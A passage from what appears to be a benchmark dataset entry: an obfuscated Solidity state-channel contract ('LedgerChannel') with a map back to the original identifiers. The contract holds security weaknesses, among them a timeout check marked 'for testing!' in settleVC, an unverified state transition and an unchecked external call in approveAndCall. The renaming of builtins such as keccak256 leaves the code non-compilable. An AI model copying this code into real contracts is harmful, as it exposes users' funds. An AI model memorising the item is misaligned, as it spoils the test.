_0x5bb1bf;               // Give the creator all initial tokens\n        _0xb6bdd3 = _0x5bb1bf;                        // Update total supply\n        _0x7245fc = _0xed2893;                                   // Set the name for display purposes\n        _0x7b7072 = _0x58815a;                            // Amount of decimals for display purposes\n        _0xc1dc75 = _0xa6fdb1;                               // Set the symbol for display purposes\n    }\n\n    /* Approves and then calls the receiving contract */\n    function _0xadf522(address _0x5297fc, uint256 _0x34edf1, bytes _0x425673) public returns (bool _0x953439) {\n        _0x689618[msg.sender][_0x5297fc] = _0x34edf1;\n        emit Approval(msg.sender, _0x5297fc, _0x34edf1);\n\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n        require(_0x5297fc.call(bytes4(bytes32(_0x4e411f(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _0x34edf1, this, _0x425673));\n        return true;\n    }\n}\n\ncontract LedgerChannel {\n\n    string public constant NAME = \"Ledger Channel\";\n    string public constant VERSION = \"0.0.1\";\n\n    uint256 public _0x0f88b9 = 0;\n\n    event DidLCOpen (\n        bytes32 indexed _0x6f8ba7,\n        address indexed _0xdb41a1,\n        address indexed _0x1d9f6e,\n        uint256 _0x8c9b92,\n        address _0x536d6a,\n        uint256 _0xb9d119,\n        uint256 LCopenTimeout\n    );\n\n    event DidLCJoin (\n        bytes32 indexed _0x6f8ba7,\n        uint256 _0xa1a270,\n        uint256 _0x6ca962\n    );\n\n    event DidLCDeposit (\n        bytes32 indexed _0x6f8ba7,\n        address indexed _0x152fae,\n        uint256 _0x915bc1,\n        bool _0x5588b2\n    );\n\n    event DidLCUpdateState (\n        bytes32 indexed _0x6f8ba7,\n        uint256 _0x88186f,\n        uint256 _0xec4264,\n        uint256 _0x8c9b92,\n        uint256 _0xb9d119,\n        uint256 _0xa1a270,\n        uint256 _0x6ca962,\n        bytes32 _0xb3f252,\n        uint256 _0x233941\n    );\n\n    event DidLCClose (\n        bytes32 indexed _0x6f8ba7,\n        uint256 _0x88186f,\n        uint256 _0x8c9b92,\n        uint256 _0xb9d119,\n        uint256 _0xa1a270,\n        uint256 _0x6ca962\n    );\n\n    event DidVCInit (\n        bytes32 indexed _0x821ca8,\n        bytes32 indexed _0x0e6964,\n        bytes _0x3b3907,\n        uint256 _0x88186f,\n        address _0xdb41a1,\n        address _0x06fd6a,\n        uint256 _0x1c86ec,\n        uint256 _0x4722d0\n    );\n\n    event DidVCSettle (\n        bytes32 indexed _0x821ca8,\n        bytes32 indexed _0x0e6964,\n        uint256 _0x4d991b,\n        uint256 _0xdaf6fa,\n        uint256 _0x7f04aa,\n        address _0x0fc96b,\n        uint256 _0x72ffe0\n    );\n\n    event DidVCClose(\n        bytes32 indexed _0x821ca8,\n        bytes32 indexed _0x0e6964,\n        uint256 _0x1c86ec,\n        uint256 _0x4722d0\n    );\n\n    struct Channel {\n        //TODO: figure out if it's better just to split arrays by balances/deposits instead of eth/erc20\n        address[2] _0x9b140c; // 0: partyA 1: partyI\n        uint256[4] _0xff38d1; // 0: balanceA 1:balanceI 2:depositedA 3:depositedI\n        uint256[4] _0x2f273b; // 0: balanceA 1:balanceI 2:depositedA 3:depositedI\n        uint256[2] _0x94aba1; // 0: eth 1: tokens\n        uint256 _0x88186f;\n        uint256 _0x8bcbd4;\n        bytes32 VCrootHash;\n        uint256 LCopenTimeout;\n        uint256 _0x233941; // when update LC times out\n        bool _0x5d7ad6; // true when both parties have joined\n        bool _0xf8c57c;\n        uint256 _0xba8241;\n        HumanStandardToken _0x536d6a;\n    }\n\n    // virtual-channel state\n    struct VirtualChannel {\n        bool _0xfa1b80;\n        bool _0x46f342;\n        uint256 _0x88186f;\n        address _0x0fc96b; // Initiator of challenge\n        uint256 _0x72ffe0; // when update VC times out\n        // channel state\n        address _0xdb41a1; // VC participant A\n        address _0x06fd6a; // VC participant B\n        address _0x1d9f6e; // LC hub\n        uint256[2] _0xff38d1;\n        uint256[2] _0x2f273b;\n        uint256[2] _0x37214c;\n        HumanStandardToken _0x536d6a;\n    }\n\n    mapping(bytes32 => VirtualChannel) public _0x0834d5;\n    mapping(bytes32 => Channel) public Channels;\n\n    function _0x959246(\n        bytes32 _0x0682e0,\n        address _0xcfc1eb,\n        uint256 _0x682da2,\n        address _0xcc1087,\n        uint256[2] _0x68f346 // [eth, token]\n    )\n        public\n        payable\n    {\n        require(Channels[_0x0682e0]._0x9b140c[0] == address(0), \"Channel has already been created.\");\n        require(_0xcfc1eb != 0x0, \"No partyI address provided to LC creation\");\n        require(_0x68f346[0] >= 0 && _0x68f346[1] >= 0, \"Balances cannot be negative\");\n        // Set initial ledger channel state\n        // Alice must execute this and we assume the initial state\n        // to be signed from this requirement\n        // Alternative is to check a sig as in joinChannel\n        Channels[_0x0682e0]._0x9b140c[0] = msg.sender;\n        Channels[_0x0682e0]._0x9b140c[1] = _0xcfc1eb;\n\n        if(_0x68f346[0] != 0) {\n            require(msg.value == _0x68f346[0], \"Eth balance does not match sent value\");\n            Channels[_0x0682e0]._0xff38d1[0] = msg.value;\n        }\n        if(_0x68f346[1] != 0) {\n            Channels[_0x0682e0]._0x536d6a = HumanStandardToken(_0xcc1087);\n            require(Channels[_0x0682e0]._0x536d6a._0x6cad58(msg.sender, this, _0x68f346[1]),\"CreateChannel: token transfer failure\");\n            Channels[_0x0682e0]._0x2f273b[0] = _0x68f346[1];\n        }\n\n        Channels[_0x0682e0]._0x88186f = 0;\n        Channels[_0x0682e0]._0x8bcbd4 = _0x682da2;\n        // is close flag, lc state sequence, number open vc, vc root hash, partyA...\n        //Channels[_lcID].stateHash = keccak256(uint256(0), uint256(0), uint256(0), bytes32(0x0), bytes32(msg.sender), bytes32(_partyI), balanceA, balanceI);\n        Channels[_0x0682e0].LCopenTimeout = _0x7216b3 + _0x682da2;\n        Channels[_0x0682e0]._0x94aba1 = _0x68f346;\n\n        emit DidLCOpen(_0x0682e0, msg.sender, _0xcfc1eb, _0x68f346[0], _0xcc1087, _0x68f346[1], Channels[_0x0682e0].LCopenTimeout);\n    }\n\n    function LCOpenTimeout(bytes32 _0x0682e0) public {\n        require(msg.sender == Channels[_0x0682e0]._0x9b140c[0] && Channels[_0x0682e0]._0x5d7ad6 == false);\n        require(_0x7216b3 > Channels[_0x0682e0].LCopenTimeout);\n\n        if(Channels[_0x0682e0]._0x94aba1[0] != 0) {\n            Channels[_0x0682e0]._0x9b140c[0].transfer(Channels[_0x0682e0]._0xff38d1[0]);\n        }\n        if(Channels[_0x0682e0]._0x94aba1[1] != 0) {\n            require(Channels[_0x0682e0]._0x536d6a.transfer(Channels[_0x0682e0]._0x9b140c[0], Channels[_0x0682e0]._0x2f273b[0]),\"CreateChannel: token transfer failure\");\n        }\n\n        emit DidLCClose(_0x0682e0, 0, Channels[_0x0682e0]._0xff38d1[0], Channels[_0x0682e0]._0x2f273b[0], 0, 0);\n\n        // only safe to delete since no action was taken on this channel\n        delete Channels[_0x0682e0];\n    }\n\n    function _0x23e107(bytes32 _0x0682e0, uint256[2] _0x68f346) public payable {\n        // require the channel is not open yet\n        require(Channels[_0x0682e0]._0x5d7ad6 == false);\n        require(msg.sender == Channels[_0x0682e0]._0x9b140c[1]);\n\n        if(_0x68f346[0] != 0) {\n            require(msg.value == _0x68f346[0], \"state balance does not match sent value\");\n            Channels[_0x0682e0]._0xff38d1[1] = msg.value;\n        }\n        if(_0x68f346[1] != 0) {\n            require(Channels[_0x0682e0]._0x536d6a._0x6cad58(msg.sender, this, _0x68f346[1]),\"joinChannel: token transfer failure\");\n            Channels[_0x0682e0]._0x2f273b[1] = _0x68f346[1];\n        }\n\n        Channels[_0x0682e0]._0x94aba1[0]+=_0x68f346[0];\n        Channels[_0x0682e0]._0x94aba1[1]+=_0x68f346[1];\n        // no longer allow joining functions to be called\n        Channels[_0x0682e0]._0x5d7ad6 = true;\n        _0x0f88b9++;\n\n        emit DidLCJoin(_0x0682e0, _0x68f346[0], _0x68f346[1]);\n    }\n\n    // additive updates of monetary state\n    function _0x915bc1(bytes32 _0x0682e0, address _0x152fae, uint256 _0x86e623, bool _0x5588b2) public payable {\n        require(Channels[_0x0682e0]._0x5d7ad6 == true, \"Tried adding funds to a closed channel\");\n        require(_0x152fae == Channels[_0x0682e0]._0x9b140c[0] || _0x152fae == Channels[_0x0682e0]._0x9b140c[1]);\n\n        //if(Channels[_lcID].token)\n\n        if (Channels[_0x0682e0]._0x9b140c[0] == _0x152fae) {\n            if(_0x5588b2) {\n                require(Channels[_0x0682e0]._0x536d6a._0x6cad58(msg.sender, this, _0x86e623),\"deposit: token transfer failure\");\n                Channels[_0x0682e0]._0x2f273b[2] += _0x86e623;\n            } else {\n                require(msg.value == _0x86e623, \"state balance does not match sent value\");\n                Channels[_0x0682e0]._0xff38d1[2] += msg.value;\n            }\n        }\n\n        if (Channels[_0x0682e0]._0x9b140c[1] == _0x152fae) {\n            if(_0x5588b2) {\n                require(Channels[_0x0682e0]._0x536d6a._0x6cad58(msg.sender, this, _0x86e623),\"deposit: token transfer failure\");\n                Channels[_0x0682e0]._0x2f273b[3] += _0x86e623;\n            } else {\n                require(msg.value == _0x86e623, \"state balance does not match sent value\");\n                Channels[_0x0682e0]._0xff38d1[3] += msg.value;\n            }\n        }\n\n        emit DidLCDeposit(_0x0682e0, _0x152fae, _0x86e623, _0x5588b2);\n    }\n\n    // TODO: Check there are no open virtual channels, the client should have cought this before signing a close LC state update\n    function _0x30957f(\n        bytes32 _0x0682e0,\n        uint256 _0x74c834,\n        uint256[4] _0x68f346, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n        string _0xc767ea,\n        string _0x3a8f81\n    )\n        public\n    {\n        // assume num open vc is 0 and root hash is 0x0\n        //require(Channels[_lcID].sequence < _sequence);\n        require(Channels[_0x0682e0]._0x5d7ad6 == true);\n        uint256 _0x99993a = Channels[_0x0682e0]._0x94aba1[0] + Channels[_0x0682e0]._0xff38d1[2] + Channels[_0x0682e0]._0xff38d1[3];\n        uint256 _0xeba4a8 = Channels[_0x0682e0]._0x94aba1[1] + Channels[_0x0682e0]._0x2f273b[2] + Channels[_0x0682e0]._0x2f273b[3];\n        require(_0x99993a == _0x68f346[0] + _0x68f346[1]);\n        require(_0xeba4a8 == _0x68f346[2] + _0x68f346[3]);\n\n        bytes32 _0xe2e099 = _0x4e411f(\n            abi._0x19c983(\n                _0x0682e0,\n                true,\n                _0x74c834,\n                uint256(0),\n                bytes32(0x0),\n                Channels[_0x0682e0]._0x9b140c[0],\n                Channels[_0x0682e0]._0x9b140c[1],\n                _0x68f346[0],\n                _0x68f346[1],\n                _0x68f346[2],\n                _0x68f346[3]\n            )\n        );\n\n        require(Channels[_0x0682e0]._0x9b140c[0] == ECTools._0x1b5c77(_0xe2e099, _0xc767ea));\n        require(Channels[_0x0682e0]._0x9b140c[1] == ECTools._0x1b5c77(_0xe2e099, _0x3a8f81));\n\n        Channels[_0x0682e0]._0x5d7ad6 = false;\n\n        if(_0x68f346[0] != 0 || _0x68f346[1] != 0) {\n            Channels[_0x0682e0]._0x9b140c[0].transfer(_0x68f346[0]);\n            Channels[_0x0682e0]._0x9b140c[1].transfer(_0x68f346[1]);\n        }\n\n        if(_0x68f346[2] != 0 || _0x68f346[3] != 0) {\n            require(Channels[_0x0682e0]._0x536d6a.transfer(Channels[_0x0682e0]._0x9b140c[0], _0x68f346[2]),\"happyCloseChannel: token transfer failure\");\n            require(Channels[_0x0682e0]._0x536d6a.transfer(Channels[_0x0682e0]._0x9b140c[1], _0x68f346[3]),\"happyCloseChannel: token transfer failure\");\n        }\n\n        _0x0f88b9--;\n\n        emit DidLCClose(_0x0682e0, _0x74c834, _0x68f346[0], _0x68f346[1], _0x68f346[2], _0x68f346[3]);\n    }\n\n    // Byzantine functions\n\n    function _0x6007f8(\n        bytes32 _0x0682e0,\n        uint256[6] _0xaeab24, // [sequence, numOpenVc, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI]\n        bytes32 _0x5bb43e,\n        string _0xc767ea,\n        string _0x3a8f81\n    )\n        public\n    {\n        Channel storage _0xa569fd = Channels[_0x0682e0];\n        require(_0xa569fd._0x5d7ad6);\n        require(_0xa569fd._0x88186f < _0xaeab24[0]); // do same as vc sequence check\n        require(_0xa569fd._0xff38d1[0] + _0xa569fd._0xff38d1[1] >= _0xaeab24[2] + _0xaeab24[3]);\n        require(_0xa569fd._0x2f273b[0] + _0xa569fd._0x2f273b[1] >= _0xaeab24[4] + _0xaeab24[5]);\n\n        if(_0xa569fd._0xf8c57c == true) {\n            require(_0xa569fd._0x233941 > _0x7216b3);\n        }\n\n        bytes32 _0xe2e099 = _0x4e411f(\n            abi._0x19c983(\n                _0x0682e0,\n                false,\n                _0xaeab24[0],\n                _0xaeab24[1],\n                _0x5bb43e,\n                _0xa569fd._0x9b140c[0],\n                _0xa569fd._0x9b140c[1],\n                _0xaeab24[2],\n                _0xaeab24[3],\n                _0xaeab24[4],\n                _0xaeab24[5]\n            )\n        );\n\n        require(_0xa569fd._0x9b140c[0] == ECTools._0x1b5c77(_0xe2e099, _0xc767ea));\n        require(_0xa569fd._0x9b140c[1] == ECTools._0x1b5c77(_0xe2e099, _0x3a8f81));\n\n        // update LC state\n        _0xa569fd._0x88186f = _0xaeab24[0];\n        _0xa569fd._0xba8241 = _0xaeab24[1];\n        _0xa569fd._0xff38d1[0] = _0xaeab24[2];\n        _0xa569fd._0xff38d1[1] = _0xaeab24[3];\n        _0xa569fd._0x2f273b[0] = _0xaeab24[4];\n        _0xa569fd._0x2f273b[1] = _0xaeab24[5];\n        _0xa569fd.VCrootHash = _0x5bb43e;\n        _0xa569fd._0xf8c57c = true;\n        _0xa569fd._0x233941 = _0x7216b3 + _0xa569fd._0x8bcbd4;\n\n        // make settlement flag\n\n        emit DidLCUpdateState (\n            _0x0682e0,\n            _0xaeab24[0],\n            _0xaeab24[1],\n            _0xaeab24[2],\n            _0xaeab24[3],\n            _0xaeab24[4],\n            _0xaeab24[5],\n            _0x5bb43e,\n            _0xa569fd._0x233941\n        );\n    }\n\n    // supply initial state of VC to \"prime\" the force push game\n    function _0x8f880a(\n        bytes32 _0x0682e0,\n        bytes32 _0x4beb3a,\n        bytes _0xd37455,\n        address _0x47c02e,\n        address _0xbdb336,\n        uint256[2] _0x5032d9,\n        uint256[4] _0x68f346, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n        string _0x630298\n    )\n        public\n    {\n        require(Channels[_0x0682e0]._0x5d7ad6, \"LC is closed.\");\n        // sub-channel must be open\n        require(!_0x0834d5[_0x4beb3a]._0xfa1b80, \"VC is closed.\");\n        // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n        require(Channels[_0x0682e0]._0x233941 < _0x7216b3, \"LC timeout not over.\");\n        // prevent rentry of initializing vc state\n        require(_0x0834d5[_0x4beb3a]._0x72ffe0 == 0);\n        // partyB is now Ingrid\n        bytes32 _0x9df7d1 = _0x4e411f(\n            abi._0x19c983(_0x4beb3a, uint256(0), _0x47c02e, _0xbdb336, _0x5032d9[0], _0x5032d9[1], _0x68f346[0], _0x68f346[1], _0x68f346[2], _0x68f346[3])\n        );\n\n        // Make sure Alice has signed initial vc state (A/B in oldState)\n        require(_0x47c02e == ECTools._0x1b5c77(_0x9df7d1, _0x630298));\n\n        // Check the oldState is in the root hash\n        require(_0x5b303e(_0x9df7d1, _0xd37455, Channels[_0x0682e0].VCrootHash) == true);\n\n        _0x0834d5[_0x4beb3a]._0xdb41a1 = _0x47c02e; // VC participant A\n        _0x0834d5[_0x4beb3a]._0x06fd6a = _0xbdb336; // VC participant B\n        _0x0834d5[_0x4beb3a]._0x88186f = uint256(0);\n        _0x0834d5[_0x4beb3a]._0xff38d1[0] = _0x68f346[0];\n        _0x0834d5[_0x4beb3a]._0xff38d1[1] = _0x68f346[1];\n        _0x0834d5[_0x4beb3a]._0x2f273b[0] = _0x68f346[2];\n        _0x0834d5[_0x4beb3a]._0x2f273b[1] = _0x68f346[3];\n        _0x0834d5[_0x4beb3a]._0x37214c = _0x5032d9;\n        _0x0834d5[_0x4beb3a]._0x72ffe0 = _0x7216b3 + Channels[_0x0682e0]._0x8bcbd4;\n        _0x0834d5[_0x4beb3a]._0x46f342 = true;\n\n        emit DidVCInit(_0x0682e0, _0x4beb3a, _0xd37455, uint256(0), _0x47c02e, _0xbdb336, _0x68f346[0], _0x68f346[1]);\n    }\n\n    //TODO: verify state transition since the hub did not agree to this state\n    // make sure the A/B balances are not beyond ingrids bonds\n    // Params: vc init state, vc final balance, vcID\n    function _0xba8e59(\n        bytes32 _0x0682e0,\n        bytes32 _0x4beb3a,\n        uint256 _0x4d991b,\n        address _0x47c02e,\n        address _0xbdb336,\n        uint256[4] _0x6ee744, // [ethupdateBalA, ethupdateBalB, tokenupdateBalA, tokenupdateBalB]\n        string _0x630298\n    )\n        public\n    {\n        require(Channels[_0x0682e0]._0x5d7ad6, \"LC is closed.\");\n        // sub-channel must be open\n        require(!_0x0834d5[_0x4beb3a]._0xfa1b80, \"VC is closed.\");\n        require(_0x0834d5[_0x4beb3a]._0x88186f < _0x4d991b, \"VC sequence is higher than update sequence.\");\n        require(\n            _0x0834d5[_0x4beb3a]._0xff38d1[1] < _0x6ee744[1] && _0x0834d5[_0x4beb3a]._0x2f273b[1] < _0x6ee744[3],\n            \"State updates may only increase recipient balance.\"\n        );\n        require(\n            _0x0834d5[_0x4beb3a]._0x37214c[0] == _0x6ee744[0] + _0x6ee744[1] &&\n            _0x0834d5[_0x4beb3a]._0x37214c[1] == _0x6ee744[2] + _0x6ee744[3],\n            \"Incorrect balances for bonded amount\");\n        // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n        // virtualChannels[_vcID].updateVCtimeout should be 0 on uninitialized vc state, and this should\n        // fail if initVC() isn't called first\n        // require(Channels[_lcID].updateLCtimeout < now && now < virtualChannels[_vcID].updateVCtimeout);\n        require(Channels[_0x0682e0]._0x233941 < _0x7216b3); // for testing!\n\n        bytes32 _0x491dc7 = _0x4e411f(\n            abi._0x19c983(\n                _0x4beb3a,\n                _0x4d991b,\n                _0x47c02e,\n                _0xbdb336,\n                _0x0834d5[_0x4beb3a]._0x37214c[0],\n                _0x0834d5[_0x4beb3a]._0x37214c[1],\n                _0x6ee744[0],\n                _0x6ee744[1],\n                _0x6ee744[2],\n                _0x6ee744[3]\n            )\n        );\n\n        // Make sure Alice has signed a higher sequence new state\n        require(_0x0834d5[_0x4beb3a]._0xdb41a1 == ECTools._0x1b5c77(_0x491dc7, _0x630298));\n\n        // store VC data\n        // we may want to record who is initiating on-chain settles\n        _0x0834d5[_0x4beb3a]._0x0fc96b = msg.sender;\n        _0x0834d5[_0x4beb3a]._0x88186f = _0x4d991b;\n\n        // channel state\n        _0x0834d5[_0x4beb3a]._0xff38d1[0] = _0x6ee744[0];\n        _0x0834d5[_0x4beb3a]._0xff38d1[1] = _0x6ee744[1];\n        _0x0834d5[_0x4beb3a]._0x2f273b[0] = _0x6ee744[2];\n        _0x0834d5[_0x4beb3a]._0x2f273b[1] = _0x6ee744[3];\n\n        _0x0834d5[_0x4beb3a]._0x72ffe0 = _0x7216b3 + Channels[_0x0682e0]._0x8bcbd4;\n\n        emit DidVCSettle(_0x0682e0, _0x4beb3a, _0x4d991b, _0x6ee744[0], _0x6ee744[1], msg.sender, _0x0834d5[_0x4beb3a]._0x72ffe0);\n    }\n\n    function _0x7435a7(bytes32 _0x0682e0, bytes32 _0x4beb3a) public {\n        // require(updateLCtimeout > now)\n        require(Channels[_0x0682e0]._0x5d7ad6, \"LC is closed.\");\n        require(_0x0834d5[_0x4beb3a]._0x46f342, \"VC is not in settlement state.\");\n        require(_0x0834d5[_0x4beb3a]._0x72ffe0 < _0x7216b3, \"Update vc timeout has not elapsed.\");\n        require(!_0x0834d5[_0x4beb3a]._0xfa1b80, \"VC is already closed\");\n        // reduce the number of open virtual channels stored on LC\n        Channels[_0x0682e0]._0xba8241--;\n        // close vc flags\n        _0x0834d5[_0x4beb3a]._0xfa1b80 = true;\n        // re-introduce the balances back into the LC state from the settled VC\n        // decide if this lc is alice or bob in the vc\n        if(_0x0834d5[_0x4beb3a]._0xdb41a1 == Channels[_0x0682e0]._0x9b140c[0]) {\n            Channels[_0x0682e0]._0xff38d1[0] += _0x0834d5[_0x4beb3a]._0xff38d1[0];\n            Channels[_0x0682e0]._0xff38d1[1] += _0x0834d5[_0x4beb3a]._0xff38d1[1];\n\n            Channels[_0x0682e0]._0x2f273b[0] += _0x0834d5[_0x4beb3a]._0x2f273b[0];\n            Channels[_0x0682e0]._0x2f273b[1] += _0x0834d5[_0x4beb3a]._0x2f273b[1];\n        } else if (_0x0834d5[_0x4beb3a]._0x06fd6a == Channels[_0x0682e0]._0x9b140c[0]) {\n            Channels[_0x0682e0]._0xff38d1[0] += _0x0834d5[_0x4beb3a]._0xff38d1[1];\n            Channels[_0x0682e0]._0xff38d1[1] += _0x0834d5[_0x4beb3a]._0xff38d1[0];\n\n            Channels[_0x0682e0]._0x2f273b[0] += _0x0834d5[_0x4beb3a]._0x2f273b[1];\n            Channels[_0x0682e0]._0x2f273b[1] += _0x0834d5[_0x4beb3a]._0x2f273b[0];\n        }\n\n        emit DidVCClose(_0x0682e0, _0x4beb3a, _0x0834d5[_0x4beb3a]._0x2f273b[0], _0x0834d5[_0x4beb3a]._0x2f273b[1]);\n    }\n\n    // todo: allow ethier lc.end-user to nullify the settled LC state and return to off-chain\n    function _0x0c7997(bytes32 _0x0682e0) public {\n        Channel storage _0xa569fd = Channels[_0x0682e0];\n\n        // check settlement flag\n        require(_0xa569fd._0x5d7ad6, \"Channel is not open\");\n        require(_0xa569fd._0xf8c57c == true);\n        require(_0xa569fd._0xba8241 == 0);\n        require(_0xa569fd._0x233941 < _0x7216b3, \"LC timeout over.\");\n\n        // if off chain state update didnt reblance deposits, just return to deposit owner\n        uint256 _0x99993a = _0xa569fd._0x94aba1[0] + _0xa569fd._0xff38d1[2] + _0xa569fd._0xff38d1[3];\n        uint256 _0xeba4a8 = _0xa569fd._0x94aba1[1] + _0xa569fd._0x2f273b[2] + _0xa569fd._0x2f273b[3];\n\n        uint256 _0xd6d4eb = _0xa569fd._0xff38d1[0] + _0xa569fd._0xff38d1[1];\n        uint256 _0xaf20f9 = _0xa569fd._0x2f273b[0] + _0xa569fd._0x2f273b[1];\n\n        if(_0xd6d4eb < _0x99993a) {\n            _0xa569fd._0xff38d1[0]+=_0xa569fd._0xff38d1[2];\n            _0xa569fd._0xff38d1[1]+=_0xa569fd._0xff38d1[3];\n        } else {\n            require(_0xd6d4eb == _0x99993a);\n        }\n\n        if(_0xaf20f9 < _0xeba4a8) {\n            _0xa569fd._0x2f273b[0]+=_0xa569fd._0x2f273b[2];\n            _0xa569fd._0x2f273b[1]+=_0xa569fd._0x2f273b[3];\n        } else {\n            require(_0xaf20f9 == _0xeba4a8);\n        }\n\n        uint256 _0x10dc12 = _0xa569fd._0xff38d1[0];\n        uint256 _0x1252df = _0xa569fd._0xff38d1[1];\n        uint256 _0x558eb3 = _0xa569fd._0x2f273b[0];\n        uint256 _0x5faa9b = _0xa569fd._0x2f273b[1];\n\n        _0xa569fd._0xff38d1[0] = 0;\n        _0xa569fd._0xff38d1[1] = 0;\n        _0xa569fd._0x2f273b[0] = 0;\n        _0xa569fd._0x2f273b[1] = 0;\n\n        if(_0x10dc12 != 0 || _0x1252df != 0) {\n            _0xa569fd._0x9b140c[0].transfer(_0x10dc12);\n            _0xa569fd._0x9b140c[1].transfer(_0x1252df);\n        }\n\n        if(_0x558eb3 != 0 || _0x5faa9b != 0) {\n            require(\n                _0xa569fd._0x536d6a.transfer(_0xa569fd._0x9b140c[0], _0x558eb3),\n                \"byzantineCloseChannel: token transfer failure\"\n            );\n            require(\n                _0xa569fd._0x536d6a.transfer(_0xa569fd._0x9b140c[1], _0x5faa9b),\n                \"byzantineCloseChannel: token transfer failure\"\n            );\n        }\n\n        _0xa569fd._0x5d7ad6 = false;\n        _0x0f88b9--;\n\n        emit DidLCClose(_0x0682e0, _0xa569fd._0x88186f, _0x10dc12, _0x1252df, _0x558eb3, _0x5faa9b);\n    }\n\n    function _0x5b303e(bytes32 _0x187c6f, bytes _0xd37455, bytes32 _0x5fb9d0) internal pure returns (bool) {\n        bytes32 _0x2eb574 = _0x187c6f;\n        bytes32 _0x7dc1ad;\n\n        for (uint256 i = 64; i <= _0xd37455.length; i += 32) {\n            assembly { _0x7dc1ad := mload(add(_0xd37455, i)) }\n\n            if (_0x2eb574 < _0x7dc1ad) {\n                _0x2eb574 = _0x4e411f(abi._0x19c983(_0x2eb574, _0x7dc1ad));\n            } else {\n                if (true) { _0x2eb574 = _0x4e411f(abi._0x19c983(_0x7dc1ad, _0x2eb574)); }\n            }\n        }\n\n        return _0x2eb574 == _0x5fb9d0;\n    }\n\n    //Struct Getters\n    function _0x547177(bytes32 _0xa1cbfb) public view returns (\n        address[2],\n        uint256[4],\n        uint256[4],\n        uint256[2],\n        uint256,\n        uint256,\n        bytes32,\n        uint256,\n        uint256,\n        bool,\n        bool,\n        uint256\n    ) {\n        Channel memory _0xa569fd = Channels[_0xa1cbfb];\n        return (\n            _0xa569fd._0x9b140c,\n            _0xa569fd._0xff38d1,\n            _0xa569fd._0x2f273b,\n            _0xa569fd._0x94aba1,\n            _0xa569fd._0x88186f,\n            _0xa569fd._0x8bcbd4,\n            _0xa569fd.VCrootHash,\n            _0xa569fd.LCopenTimeout,\n            _0xa569fd._0x233941,\n            _0xa569fd._0x5d7ad6,\n            _0xa569fd._0xf8c57c,\n            _0xa569fd._0xba8241\n        );\n    }\n\n    function _0x682537(bytes32 _0xa1cbfb) public view returns(\n        bool,\n        bool,\n        uint256,\n        address,\n        uint256,\n        address,\n        address,\n        address,\n        uint256[2],\n        uint256[2],\n        uint256[2]\n    ) {\n        VirtualChannel memory _0x8455b4 = _0x0834d5[_0xa1cbfb];\n        return(\n            _0x8455b4._0xfa1b80,\n            _0x8455b4._0x46f342,\n            _0x8455b4._0x88186f,\n            _0x8455b4._0x0fc96b,\n            _0x8455b4._0x72ffe0,\n            _0x8455b4._0xdb41a1,\n            _0x8455b4._0x06fd6a,\n            _0x8455b4._0x1d9f6e,\n            _0x8455b4._0xff38d1,\n            _0x8455b4._0x2f273b,\n            _0x8455b4._0x37214c\n        );\n    }\n}",
      "rename_map": {
        "possibleTotalTokenBeforeDeposit": "_0xaf20f9",
        "possibleTotalEthBeforeDeposit": "_0xd6d4eb",
        "toEthereumSignedMessage": "_0xe110a2",
        "consensusCloseChannel": "_0x30957f",
        "byzantineCloseChannel": "_0x0c7997",
        "isInSettlementState": "_0x46f342",
        "closeVirtualChannel": "_0x7435a7",
        "isUpdateLCSettling": "_0xf8c57c",
        "totalTokenDeposit": "_0xeba4a8",
        "getVirtualChannel": "_0x682537",
        "totalEthDeposit": "_0x99993a",
        "virtualChannels": "_0x0834d5",
        "updateLCtimeout": "_0x233941",
        "updateVCtimeout": "_0x72ffe0",
        "virtualChannel": "_0x8455b4",
        "approveAndCall": "_0xadf522",
        "_initialAmount": "_0x5bb1bf",
        "parseInt16Char": "_0x923b58",
        "partyAddresses": "_0x9b140c",
        "initialDeposit": "_0x94aba1",
        "tokenbalanceI": "_0x5faa9b",
        "tokenbalanceA": "_0x558eb3",
        "hexstrToBytes": "_0x0924c0",
        "erc20Balances": "_0x2f273b",
        "tokenBalanceI": "_0x6ca962",
        "createChannel": "_0x959246",
        "updateLCstate": "_0x6007f8",
        "_decimalUnits": "_0x58815a",
        "tokenBalanceA": "_0xb9d119",
        "recoverSigner": "_0x1b5c77",
        "uintToBytes32": "_0xc81305",
        "_isContained": "_0x5b303e",
        "transferFrom": "_0x6cad58",
        "prefixedHash": "_0xa5971d",
        "encodePacked": "_0x19c983",
        "uintToString": "_0x17d7c7",
        "updateParams": "_0xaeab24",
        "_updateState": "_0x491dc7",
        "_confirmTime": "_0x682da2",
        "_tokenSymbol": "_0xa6fdb1",
        "ethBalanceA": "_0x8c9b92",
        "ethbalanceI": "_0x1252df",
        "joinChannel": "_0x23e107",
        "confirmTime": "_0x8bcbd4",
        "ethBalanceI": "_0xa1a270",
        "totalSupply": "_0xb6bdd3",
        "numChannels": "_0x0f88b9",
        "_startIndex": "_0x94b365",
        "ethbalanceA": "_0x10dc12",
        "ethBalances": "_0xff38d1",
        "initVCstate": "_0x8f880a",
        "_extraData": "_0x425673",
        "challenger": "_0x0fc96b",
        "isSignedBy": "_0xdeef15",
        "_initState": "_0x9df7d1",
        "updateBalB": "_0x7f04aa",
        "_hashedMsg": "_0x5b5dff",
        "_tokenName": "_0xed2893",
        "getChannel": "_0x547177",
        "updateBalA": "_0xdaf6fa",
        "balanceOf": "_0x99b461",
        "numOpenVC": "_0xba8241",
        "channelId": "_0x6f8ba7",
        "remainder": "_0x6a0cd0",
        "substring": "_0x6f4a52",
        "updateSeq": "_0x4d991b",
        "updateBal": "_0x6ee744",
        "allowance": "_0x47a83a",
        "numOpenVc": "_0xec4264",
        "_endIndex": "_0x100427",
        "_balances": "_0x68f346",
        "_sequence": "_0x74c834",
        "recipient": "_0x152fae",
        "remaining": "_0xedcb5c",
        "ecrecover": "_0xdd1be8",
        "keccak256": "_0x4e411f",
        "proofElem": "_0x7dc1ad",
        "sequence": "_0x88186f",
        "balanceB": "_0x4722d0",
        "decimals": "_0x7b7072",
        "strBytes": "_0x047336",
        "settleVC": "_0xba8e59",
        "_balance": "_0x86e623",
